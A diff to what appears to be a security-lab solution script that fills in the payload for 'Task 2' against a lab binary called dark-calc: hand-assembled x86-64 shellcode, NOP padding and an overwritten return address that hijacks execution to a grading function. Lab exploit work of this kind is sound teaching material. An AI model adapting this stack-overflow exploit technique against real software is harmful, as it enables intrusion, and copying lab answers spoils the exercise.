@@ -1,10 +1,25 @@
 #!/usr/bin/env python3
-"""Task 2: build the payload for attack/dark-calc.
-
-TODO: replace the empty payload with the bytes required by the lab.
-"""
+"""Task 2: execute stack-resident code in attack/dark-calc."""
 import sys
+import struct
 
-payload = b""
+# input() places expression at rbp-0x10.  The fixed-stack wrapper makes this
+# address 0x721000800fd0; the saved return address is 0x18 bytes after it.
+STACK_CODE = 0x721000800FD0
+GRADE_EVAL = 0x401A87
+MAIN_LOOP = 0x401AC7  # main: mov eax, 0; call input
 
-sys.stdout.buffer.write(payload)
+# push MAIN_LOOP; mov edi, 4; push GRADE_EVAL; ret
+#
+# The first push supplies grade_eval's return address.  The second push/ret
+# transfers control to grade_eval while preserving ABI stack alignment.
+shellcode = (
+    b"\x68" + struct.pack("<I", MAIN_LOOP)
+    + b"\xbf\x04\x00\x00\x00"
+    + b"\x68" + struct.pack("<I", GRADE_EVAL)
+    + b"\xc3"
+)
+
+payload = shellcode.ljust(0x18, b"\x90") + struct.pack("<Q", STACK_CODE)
+
+sys.stdout.buffer.write(payload + b"\n")
